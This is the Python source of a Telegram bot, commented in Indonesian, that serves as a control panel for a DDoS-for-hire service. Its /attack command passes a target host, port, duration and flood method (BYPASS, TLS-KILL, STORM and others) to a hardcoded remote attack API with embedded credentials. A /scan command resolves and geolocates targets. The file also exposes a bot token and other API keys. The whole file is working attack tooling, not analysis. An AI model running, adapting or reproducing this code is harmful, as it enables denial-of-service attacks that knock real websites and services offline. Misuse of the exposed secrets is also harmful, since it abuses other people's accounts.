import logging
import socket
import requests
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ID grup yang diizinkan
ALLOWED_CHAT_ID = -1002456492650
GROUP_JOIN_LINK = "https://t.me/veccychat"

# Admin ID
ADMIN_USER_ID = 1987642016

# Token bot
BOT_TOKEN = "7500966509:AAGByZ44gAoxvDjYGuIdmfoO8U-mebyAeCI"

# Global variables
bot_mode = "public"
admin_message = ""

# Konfigurasi logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# Fungsi untuk memeriksa apakah user sudah bergabung di grup yang benar
async def check_user_in_allowed_group(update: Update) -> bool:
    if update.message.chat.id != ALLOWED_CHAT_ID:
        return False
    return True

# Fungsi untuk menangani command /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(f"⚠️ Oops! Access Denied! You can only use this command in the official group: 👉 {GROUP_JOIN_LINK}")
        return

    keyboard = [
        ['/attack', '/scan'],  
        ['/methods']
    ]
    
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    
    await update.message.reply_text("Hello! 👋\nChoose an option below to get started 🧑‍💻:", reply_markup=reply_markup)

# Fungsi untuk menangani command /attack
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_mode == "self" and update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text(f"🔴 Bot is offline!\n\nMessage: {admin_message}\nFrom: Admin\nBot is currently offline. Only admin can use the bot.")
        return

    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(f"⚠️ Oops! Access Denied! You can only use this command in the official group: 👉 {GROUP_JOIN_LINK}")
        return

    if len(context.args) == 0:
        await update.message.reply_text("🔔 How to use /attack:\n\n/attack <host> <port> <time> <method>\nExample: /attack https://example.com 443 60 BYPASS")
        return

    if len(context.args) != 4:
        await update.message.reply_text("⚠️ Invalid format! Please use: /attack <host> <port> <time> <method>")
        return

    host = context.args[0]
    port = context.args[1]
    time = context.args[2]
    method = context.args[3]

    api_url_1 = f"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host={host}&port={port}&time={time}&method={method}"
    api_url_2 = f"http://159.65.143.83:8080/api?key=lizard@keis&username=lizardpredator&host={host}&port={port}&time={time}&method={method}"

    try:
        response_1 = requests.get(api_url_1)
        response_2 = requests.get(api_url_2)

        if response_1.status_code == 200:
            await update.message.reply_text(f"🎯 Attack successfully launched!\n💥 Target: {host}:{port}\n⏳ Duration: {time} seconds\n⚡ Method: {method}\n\n✅ API Response: {response_1.text}")
        else:
            await update.message.reply_text(f"❌ Error: {response_1.text}")

        if response_2.status_code == 200:
            logging.info(f"API 2 Response: {response_2.text}")
        else:
            logging.error(f"API 2 Error: {response_2.text}")

    except requests.RequestException as e:
        logging.error(f"Error accessing API: {e}")
        await update.message.reply_text("⚠️ Error: There was an issue connecting to the API. Please try again later!")

# Fungsi untuk menangani command /methods
async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_mode == "self" and update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text(f"🔴 Bot is offline!\n\nMessage: {admin_message}\nFrom: Admin\nBot is currently offline. Only admin can use the bot.")
        return

    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(f"⚠️ Oops! Access Denied! You can only use this command in the official group: 👉 {GROUP_JOIN_LINK}")
        return

    available_methods = """
    🔎 Available Methods:
    1. BYPASS
    2. BYPASSV2
    3. DEATH
    5. TLS-KILL
    6. STORM
    7. POWER
    8. MIX
    9. KILL
    
Choose a method for your attack!
    """
    await update.message.reply_text(available_methods)

# Fungsi untuk menangani command /scan
async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_mode == "self" and update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text(f"🔴 Bot is offline!\n\nMessage: {admin_message}\nFrom: Admin\nBot is currently offline. Only admin can use the bot.")
        return

    if not await check_user_in_allowed_group(update):
        await update.message.reply_text(f"⚠️ Oops! Access Denied! You can only use this command in the official group: 👉 {GROUP_JOIN_LINK}")
        return

    if len(context.args) != 1:
        await update.message.reply_text("⚠️ Invalid format! Use: /scan <host>\nExample: /scan 1.1.1.1 or /scan example.com")
        return

    target = context.args[0]  # Bisa berupa IP atau domain
    ip_address = target  # Default, anggap target adalah IP
    
    # Resolusi domain jika input berupa domain
    try:
        if not target.replace('.', '').isdigit():  # Jika input bukan IP
            ip_address = socket.gethostbyname(target)  # Ubah domain menjadi IP
            await update.message.reply_text(f"🔍 Resolving domain...\nDomain: {target}\nIP Address: {ip_address}")
    except socket.gaierror:
        await update.message.reply_text(f"❌ Error: Unable to resolve domain {target}. Please check the input and try again.")
        return

    # Panggil API ipinfo.io menggunakan IP
    try:
        ip_info_url = f"http://ipinfo.io/{ip_address}/json?token=52a6a96eecd131"
        response = requests.get(ip_info_url)
        if response.status_code == 200:
            ip_info = response.json()
            ip_data = f"📡 IP Information for {target}:\n" \
                      f"💻 IP: {ip_info.get('ip')}\n" \
                      f"🌍 Location: {ip_info.get('city')}, {ip_info.get('region')}, {ip_info.get('country')}\n" \
                      f"🏢 Org: {ip_info.get('org')}"
            await update.message.reply_text(ip_data)
        else:
            await update.message.reply_text(f"❌ Failed to fetch IP info for {ip_address}. Please try again later.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")

# Fungsi untuk menangani command /mode
async def mode_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global admin_message

    if update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⚠️ You do not have permission to use this command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("""
        🔔 Invalid format!
        
Please use the following format to change the bot's mode:
        
/mode <public/self> <message>
        
Example:
/mode public The bot is back online!
        """)
        return

    mode = context.args[0].lower()
    admin_message = context.args[1]

    global bot_mode
    if mode not in ['public', 'self']:
        await update.message.reply_text("⚠️ Invalid mode! Use `public` or `self`.")
        return

    bot_mode = mode
    if bot_mode == "public":
        status_message = f"""
🟢 Bot is now online!
The bot is back to full functionality.
        
Message from admin:
{admin_message}
        
✅ All users can now use the commands again.
        """
    else:  # mode == "self"
        status_message = f"""
        🔴 Bot is now offline!   
Only admin can use the bot now.
        
Message from admin:
{admin_message}
        
🚫 All other users are restricted from using the commands until the bot is switched back to public mode.
        """

    await update.message.reply_text(status_message)

# Fungsi utama untuk menjalankan bot
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("methods", methods_command))
    application.add_handler(CommandHandler("scan", scan_command))
    application.add_handler(CommandHandler("mode", mode_command))

    application.run_polling()

if __name__ == "__main__":
    main()
